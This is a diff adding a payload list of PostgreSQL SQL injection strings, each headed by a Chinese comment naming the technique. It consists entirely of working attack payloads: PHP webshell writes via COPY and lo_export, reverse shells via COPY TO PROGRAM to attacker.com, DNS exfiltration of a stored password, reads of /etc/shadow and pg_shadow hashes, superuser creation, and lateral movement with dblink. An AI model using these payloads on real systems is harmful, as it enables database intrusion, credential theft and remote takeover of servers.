@@ -1,0 +1,36 @@
+# PostgreSQL - COPY 命令写入文件 RCE
+'; COPY (SELECT '<?php system($_GET[1]);?>') TO '/var/www/html/pg.php'--
+# PostgreSQL - COPY FROM PROGRAM RCE
+'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"'--
+# PostgreSQL - 大对象 lo_export 写入 Webshell
+'; SELECT lo_export(lo_create(99999),'/var/www/html/lo.php'); INSERT INTO pg_largeobject VALUES (99999,0,'<?php system($_GET[1]);?>')--
+# PostgreSQL - pg_read_file 读取系统文件
+' UNION SELECT pg_read_file('/etc/passwd'),2,3,4,5--
+# PostgreSQL - pg_read_file 读取 /etc/shadow
+' UNION SELECT pg_read_file('/etc/shadow',0,9999),2,3,4,5--
+# PostgreSQL - pg_ls_dir 列目录
+' UNION SELECT pg_ls_dir('/var/www'),2,3,4,5--
+# PostgreSQL - 延时注入 (pg_sleep)
+' AND (SELECT CASE WHEN (SELECT current_setting('is_superuser'))='on' THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+# PostgreSQL - CAST 报错注入泄露版本
+' AND 1337=CAST((SELECT version()) AS INT)--
+# PostgreSQL - CAST 报错注入泄露数据
+' AND 1337=CAST((SELECT string_agg(table_name,',') FROM information_schema.tables WHERE table_schema=current_schema()) AS INT)--
+# PostgreSQL - 堆叠查询 + COPY FROM PROGRAM 反弹 Shell
+'; COPY (SELECT '') TO PROGRAM 'perl -e "use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");"'--
+# PostgreSQL - DNS 带外数据泄露
+'; COPY (SELECT (SELECT password FROM users LIMIT 1)) TO PROGRAM 'nslookup $(cat).attacker.com'--
+# PostgreSQL - 堆叠查询创建超级用户
+'; CREATE USER hacker WITH SUPERUSER PASSWORD 'p@ss'--
+# PostgreSQL - CREATE FUNCTION 用户定义函数执行命令
+'; CREATE OR REPLACE FUNCTION system(cmd text) RETURNS void AS $$ BEGIN EXECUTE cmd; END; $$ LANGUAGE plpgsql; SELECT system('cat /etc/shadow')--
+# PostgreSQL - 报错注入 (RAISE)
+' AND 1=(SELECT CASE WHEN (SELECT current_user)='postgres' THEN 1/0 ELSE 1 END)--
+# PostgreSQL - 类型转换报错注入
+' AND (SELECT chr(126)||current_database()||chr(126)::NUMERIC)=1--
+# PostgreSQL - UNION 提取所有用户密码哈希
+' UNION SELECT usename,passwd,3,4,5 FROM pg_shadow--
+# PostgreSQL - 无引号绕过 (CHR 拼接)
+' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=CHR(112)||CHR(117)||CHR(98)||CHR(108)||CHR(105)||CHR(99)--
+# PostgreSQL - dblink 扩展横向移动
+'; SELECT * FROM dblink('host=10.0.0.1 user=postgres password=secret','SELECT version()') AS t(ver TEXT)--
